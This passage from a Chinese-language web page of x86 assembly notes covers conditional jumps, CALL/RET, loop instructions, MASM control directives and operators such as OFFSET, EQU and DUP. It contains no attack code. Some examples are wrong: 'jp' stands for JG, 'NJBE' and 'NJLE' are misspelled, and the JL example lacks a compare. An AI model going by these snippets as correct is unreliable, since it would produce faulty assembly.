&lt;h3 id=&#34;REPNC-当CF-0且CX-ECX0时重复&#34;&gt;&lt;a href=&#34;#REPNC-当CF-0且CX-ECX0时重复&#34; class=&#34;headerlink&#34; title=&#34;REPNC 当CF=0且CX/ECX&lt;&gt;0时重复&#34;&gt;&lt;/a&gt;REPNC 当CF=0且CX/ECX&amp;lt;&amp;gt;0时重复&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;repnc movsb&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h1 id=&#34;程序转移指令&#34;&gt;&lt;a href=&#34;#程序转移指令&#34; class=&#34;headerlink&#34; title=&#34;程序转移指令&#34;&gt;&lt;/a&gt;程序转移指令&lt;/h1&gt;&lt;h2 id=&#34;简单的条件转移指令&#34;&gt;&lt;a href=&#34;#简单的条件转移指令&#34; class=&#34;headerlink&#34; title=&#34;简单的条件转移指令&#34;&gt;&lt;/a&gt;简单的条件转移指令&lt;/h2&gt;&lt;h3 id=&#34;JZ-或jE-OPR—————结果为零转移-测试条件ZF-1；相等跳转&#34;&gt;&lt;a href=&#34;#JZ-或jE-OPR—————结果为零转移-测试条件ZF-1；相等跳转&#34; class=&#34;headerlink&#34; title=&#34;JZ(或jE)  OPR—————结果为零转移, 测试条件ZF=1；相等跳转&#34;&gt;&lt;/a&gt;JZ(或jE)  OPR—————结果为零转移, 测试条件ZF=1；相等跳转&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;cmp eax,0
jz/je L1;如果ZF=1则跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNZ-或jNE-OPR-————–结果不为零转移-测试条件ZF-0；不等跳转&#34;&gt;&lt;a href=&#34;#JNZ-或jNE-OPR-————–结果不为零转移-测试条件ZF-0；不等跳转&#34; class=&#34;headerlink&#34; title=&#34;JNZ(或jNE) OPR ————–结果不为零转移,测试条件ZF=0；不等跳转&#34;&gt;&lt;/a&gt;JNZ(或jNE) OPR ————–结果不为零转移,测试条件ZF=0；不等跳转&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;and dl,10110000b
jnz/jne L2;ZF=0跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JS-OPR———————-结果为负转移-测试条件SF-1&#34;&gt;&lt;a href=&#34;#JS-OPR———————-结果为负转移-测试条件SF-1&#34; class=&#34;headerlink&#34; title=&#34;JS OPR———————-结果为负转移, 测试条件SF=1&#34;&gt;&lt;/a&gt;JS OPR———————-结果为负转移, 测试条件SF=1&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;SF=1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNS-OPR———————结果为正转移-测试条件SF-0&#34;&gt;&lt;a href=&#34;#JNS-OPR———————结果为正转移-测试条件SF-0&#34; class=&#34;headerlink&#34; title=&#34;JNS OPR———————结果为正转移, 测试条件SF=0&#34;&gt;&lt;/a&gt;JNS OPR———————结果为正转移, 测试条件SF=0&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;SF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JO-OPR———————-溢出转移-测试条件OF-1&#34;&gt;&lt;a href=&#34;#JO-OPR———————-溢出转移-测试条件OF-1&#34; class=&#34;headerlink&#34; title=&#34;JO OPR——————— 溢出转移,   测试条件OF=1&#34;&gt;&lt;/a&gt;JO OPR——————— 溢出转移,   测试条件OF=1&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;OF=1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNO-OPR-——————–不溢出转移-测试条件OF-0&#34;&gt;&lt;a href=&#34;#JNO-OPR-——————–不溢出转移-测试条件OF-0&#34; class=&#34;headerlink&#34; title=&#34;JNO OPR ——————–不溢出转移 , 测试条件OF=0&#34;&gt;&lt;/a&gt;JNO OPR ——————–不溢出转移 , 测试条件OF=0&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;OF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JP-OPR-———————结果为偶转移-测试条件PF-1&#34;&gt;&lt;a href=&#34;#JP-OPR-———————结果为偶转移-测试条件PF-1&#34; class=&#34;headerlink&#34; title=&#34;JP OPR ———————结果为偶转移, 测试条件PF=1&#34;&gt;&lt;/a&gt;JP OPR ———————结果为偶转移, 测试条件PF=1&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;PF=1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNP-OPR-——————–结果为奇转移-测试条件PF-0&#34;&gt;&lt;a href=&#34;#JNP-OPR-——————–结果为奇转移-测试条件PF-0&#34; class=&#34;headerlink&#34; title=&#34;JNP OPR ——————–结果为奇转移 , 测试条件PF=0&#34;&gt;&lt;/a&gt;JNP OPR ——————–结果为奇转移 , 测试条件PF=0&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;PF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JC-OPR-——————–-有进位转移-测试条件CF-1&#34;&gt;&lt;a href=&#34;#JC-OPR-——————–-有进位转移-测试条件CF-1&#34; class=&#34;headerlink&#34; title=&#34;JC OPR ——————– 有进位转移 , 测试条件CF=1&#34;&gt;&lt;/a&gt;JC OPR ——————– 有进位转移 , 测试条件CF=1&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;CF=1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNC-OPR-——————–无进位转移-测试条件CF-0&#34;&gt;&lt;a href=&#34;#JNC-OPR-——————–无进位转移-测试条件CF-0&#34; class=&#34;headerlink&#34; title=&#34;JNC OPR ——————–无进位转移,  测试条件CF=0&#34;&gt;&lt;/a&gt;JNC OPR ——————–无进位转移,  测试条件CF=0&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;CF=0&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;无符号比较条件转移指令-以下指令经常是CMP-OPD-OPS后面的指令根据比较结果来实现转移&#34;&gt;&lt;a href=&#34;#无符号比较条件转移指令-以下指令经常是CMP-OPD-OPS后面的指令根据比较结果来实现转移&#34; class=&#34;headerlink&#34; title=&#34;无符号比较条件转移指令(以下指令经常是CMP OPD,OPS后面的指令根据比较结果来实现转移)&#34;&gt;&lt;/a&gt;无符号比较条件转移指令(以下指令经常是CMP OPD,OPS后面的指令根据比较结果来实现转移)&lt;/h3&gt;&lt;h3 id=&#34;JB-或JNAE-opd-————–小于或者不大于等于则转移&#34;&gt;&lt;a href=&#34;#JB-或JNAE-opd-————–小于或者不大于等于则转移&#34; class=&#34;headerlink&#34; title=&#34;JB(或JNAE) opd ————–小于或者不大于等于则转移&#34;&gt;&lt;/a&gt;JB(或JNAE) opd ————–小于或者不大于等于则转移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;小于跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNB-或JAE-opd—————不小于或者大于等于则转移&#34;&gt;&lt;a href=&#34;#JNB-或JAE-opd—————不小于或者大于等于则转移&#34; class=&#34;headerlink&#34; title=&#34;JNB(或JAE) opd—————不小于或者大于等于则转移&#34;&gt;&lt;/a&gt;JNB(或JAE) opd—————不小于或者大于等于则转移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;不小于跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JA-或NJBE-OPD—————大于或者不小于等于则转移&#34;&gt;&lt;a href=&#34;#JA-或NJBE-OPD—————大于或者不小于等于则转移&#34; class=&#34;headerlink&#34; title=&#34;JA(或NJBE) OPD—————大于或者不小于等于则转移&#34;&gt;&lt;/a&gt;JA(或NJBE) OPD—————大于或者不小于等于则转移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,+127
cmp al,-128
    ja/njbe L1;不跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNA-或JBE-OPD—————不大于或者小于等于则转移&#34;&gt;&lt;a href=&#34;#JNA-或JBE-OPD—————不大于或者小于等于则转移&#34; class=&#34;headerlink&#34; title=&#34;JNA(或JBE) OPD—————不大于或者小于等于则转移&#34;&gt;&lt;/a&gt;JNA(或JBE) OPD—————不大于或者小于等于则转移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov al,+127
cmp al,-128
    jna/jbe L1;跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;带符号比较条件转移指令&#34;&gt;&lt;a href=&#34;#带符号比较条件转移指令&#34; class=&#34;headerlink&#34; title=&#34;带符号比较条件转移指令&#34;&gt;&lt;/a&gt;带符号比较条件转移指令&lt;/h3&gt;&lt;h3 id=&#34;JL-或JNGE-————–小于或者不大于等于则转移&#34;&gt;&lt;a href=&#34;#JL-或JNGE-————–小于或者不大于等于则转移&#34; class=&#34;headerlink&#34; title=&#34;JL(或JNGE) ————–小于或者不大于等于则转移&#34;&gt;&lt;/a&gt;JL(或JNGE) ————–小于或者不大于等于则转移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ax,5
mov ax,6
	jl/jnge L1;跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNL-或JGE-————–不小于或者大于等于则转移&#34;&gt;&lt;a href=&#34;#JNL-或JGE-————–不小于或者大于等于则转移&#34; class=&#34;headerlink&#34; title=&#34;JNL(或JGE)————–不小于或者大于等于则转移&#34;&gt;&lt;/a&gt;JNL(或JGE)————–不小于或者大于等于则转移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov edx,-1
cmp edx,0
    jnl/jge L1;不跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JG-或NJLE-—————大于或者不小于等于则转移&#34;&gt;&lt;a href=&#34;#JG-或NJLE-—————大于或者不小于等于则转移&#34; class=&#34;headerlink&#34; title=&#34;JG(或NJLE)—————大于或者不小于等于则转移&#34;&gt;&lt;/a&gt;JG(或NJLE)—————大于或者不小于等于则转移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ax,5
cmp ax,4
	jp/njle L1;大于则跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JNG-或JLE-—————不大于或者小于等于则转移&#34;&gt;&lt;a href=&#34;#JNG-或JLE-—————不大于或者小于等于则转移&#34; class=&#34;headerlink&#34; title=&#34;JNG(或JLE)—————不大于或者小于等于则转移&#34;&gt;&lt;/a&gt;JNG(或JLE)—————不大于或者小于等于则转移&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov ecx,0
cmp ecx,0
    jng/jle;跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JCXZ&#34;&gt;&lt;a href=&#34;#JCXZ&#34; class=&#34;headerlink&#34; title=&#34;JCXZ&#34;&gt;&lt;/a&gt;JCXZ&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;CX=0跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JECXZ&#34;&gt;&lt;a href=&#34;#JECXZ&#34; class=&#34;headerlink&#34; title=&#34;JECXZ&#34;&gt;&lt;/a&gt;JECXZ&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;ECX=0跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;JRCXZ&#34;&gt;&lt;a href=&#34;#JRCXZ&#34; class=&#34;headerlink&#34; title=&#34;JRCXZ&#34;&gt;&lt;/a&gt;JRCXZ&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;RCX=0跳转&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;调用子程序与返回指令&#34;&gt;&lt;a href=&#34;#调用子程序与返回指令&#34; class=&#34;headerlink&#34; title=&#34;调用子程序与返回指令&#34;&gt;&lt;/a&gt;调用子程序与返回指令&lt;/h2&gt;&lt;h3 id=&#34;CALL-子程序调用指令&#34;&gt;&lt;a href=&#34;#CALL-子程序调用指令&#34; class=&#34;headerlink&#34; title=&#34;CALL  子程序调用指令&#34;&gt;&lt;/a&gt;CALL  子程序调用指令&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;call SumOf;调用SumOf过程&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;RET-子程序返回指令&#34;&gt;&lt;a href=&#34;#RET-子程序返回指令&#34; class=&#34;headerlink&#34; title=&#34;RET 子程序返回指令&#34;&gt;&lt;/a&gt;RET 子程序返回指令&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;SumOf proc
    .
    .
    ret
SumOf endp&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;条件循环指令&#34;&gt;&lt;a href=&#34;#条件循环指令&#34; class=&#34;headerlink&#34; title=&#34;条件循环指令&#34;&gt;&lt;/a&gt;条件循环指令&lt;/h2&gt;&lt;h3 id=&#34;LOOP———-按ECX计算器循环&#34;&gt;&lt;a href=&#34;#LOOP———-按ECX计算器循环&#34; class=&#34;headerlink&#34; title=&#34;LOOP———-按ECX计算器循环&#34;&gt;&lt;/a&gt;LOOP———-按ECX计算器循环&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;    mov ax,0
    mov ecx,5
L1:
    inc ax
    loop L1;每次循环ax加一，循环5次&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LOOPZ————为零跳转&#34;&gt;&lt;a href=&#34;#LOOPZ————为零跳转&#34; class=&#34;headerlink&#34; title=&#34;LOOPZ————为零跳转&#34;&gt;&lt;/a&gt;LOOPZ————为零跳转&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;loopz L1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LOOPNZ————–非零跳转&#34;&gt;&lt;a href=&#34;#LOOPNZ————–非零跳转&#34; class=&#34;headerlink&#34; title=&#34;LOOPNZ————–非零跳转&#34;&gt;&lt;/a&gt;LOOPNZ————–非零跳转&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;loopnz L1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LOOPE——————-相等跳转&#34;&gt;&lt;a href=&#34;#LOOPE——————-相等跳转&#34; class=&#34;headerlink&#34; title=&#34;LOOPE——————-相等跳转&#34;&gt;&lt;/a&gt;LOOPE——————-相等跳转&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;loope L1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;LOOPNE——————-不等跳转&#34;&gt;&lt;a href=&#34;#LOOPNE——————-不等跳转&#34; class=&#34;headerlink&#34; title=&#34;LOOPNE——————-不等跳转&#34;&gt;&lt;/a&gt;LOOPNE——————-不等跳转&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;loopne L1&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;IF-ELSE-ELSEIF-ENDIF&#34;&gt;&lt;a href=&#34;#IF-ELSE-ELSEIF-ENDIF&#34; class=&#34;headerlink&#34; title=&#34;.IF .ELSE .ELSEIF .ENDIF&#34;&gt;&lt;/a&gt;.IF .ELSE .ELSEIF .ENDIF&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;.IF conditionl
    statements
[.ELSELF condition2
	statements]
[ELSE 
	statements]
.ENDIF&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;REPEAT-WHILE&#34;&gt;&lt;a href=&#34;#REPEAT-WHILE&#34; class=&#34;headerlink&#34; title=&#34;.REPEAT .WHILE&#34;&gt;&lt;/a&gt;.REPEAT .WHILE&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;.REPEAT 
    statements
.UNTIL condition
    
.WHILE condition
    statements
.ENDW&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;其它指令&#34;&gt;&lt;a href=&#34;#其它指令&#34; class=&#34;headerlink&#34; title=&#34;其它指令&#34;&gt;&lt;/a&gt;其它指令&lt;/h2&gt;&lt;h3 id=&#34;OFFSET-——————–-返回偏移地址&#34;&gt;&lt;a href=&#34;#OFFSET-——————–-返回偏移地址&#34; class=&#34;headerlink&#34; title=&#34;OFFSET ——————– 返回偏移地址&#34;&gt;&lt;/a&gt;OFFSET ——————– 返回偏移地址&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov esi,offset var1;  esi=00404000h
mov esi,offset var2;  esi=00404000h&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SEG-——————–-返回段地址&#34;&gt;&lt;a href=&#34;#SEG-——————–-返回段地址&#34; class=&#34;headerlink&#34; title=&#34;SEG  ——————– 返回段地址&#34;&gt;&lt;/a&gt;SEG  ——————– 返回段地址&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;mov esi,seg var1
mov esi,seg var2&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;EQU-——————–-等值语句&#34;&gt;&lt;a href=&#34;#EQU-——————–-等值语句&#34; class=&#34;headerlink&#34; title=&#34;EQU(=) ——————– 等值语句&#34;&gt;&lt;/a&gt;EQU(=) ——————– 等值语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;name EQU expression
name EQU symbol
name EQU &amp;lt;text&amp;gt;
    
pressKey EQU &amp;lt;&#34;Press any key to continue...&#34;, 0&amp;gt;
matrix1 EQU 10 * 10
matrix2 EQU &amp;lt;10 * 10&amp;gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;PURGE-——————–-解除语句&#34;&gt;&lt;a href=&#34;#PURGE-——————–-解除语句&#34; class=&#34;headerlink&#34; title=&#34;PURGE ——————– 解除语句&#34;&gt;&lt;/a&gt;PURGE ——————– 解除语句&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;PURGE，标识符1，标识符2，...，标识符n&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;DUP-——————–-操作数字段用复制操作符&#34;&gt;&lt;a href=&#34;#DUP-——————–-操作数字段用复制操作符&#34; class=&#34;headerlink&#34; title=&#34;DUP  ——————– 操作数字段用复制操作符&#34;&gt;&lt;/a&gt;DUP  ——————– 操作数字段用复制操作符&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;db x dup();x是重复的次数，（）里是要重复的数逗号分隔
str1 db 10 dup (&#39;!@#&#39;) ;这就是十个！@#
格式：db 重复的次数 dup (重复的内容)
buf1 db 100 dup(?);开辟100个字节的内存区&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;SEGMENT-ENDS-——————–-段定义指令&#34;&gt;&lt;a href=&#34;#SEGMENT-ENDS-——————–-段定义指令&#34; class=&#34;headerlink&#34; title=&#34;SEGMENT,ENDS ——————– 段定义指令&#34;&gt;&lt;/a&gt;SEGMENT,ENDS ——————– 段定义指令&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;segment_name SEGMENT 【定位类型】 【组合类型】 【类别名】
···;here is your code
segment ends&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;ASSUME-——————–-段地址分配指令&#34;&gt;&lt;a href=&#34;#ASSUME-——————–-段地址分配指令&#34; class=&#34;headerlink&#34; title=&#34;ASSUME ——————– 段地址分配指令&#34;&gt;&lt;/a&gt;ASSUME ——————– 段地址分配指令&lt;/h3&gt;&lt;pre class=&#34;line-numbers language-c++&#34; data-language=&#34;c++&#34;&gt;&lt;code class=&#34;language-c++&#34;&gt;.data
　　........
.code
　　........
　　assume cs:code,ds:data
start: .......
　　mov ax,data
　　mov ds,ax
　　...
ends
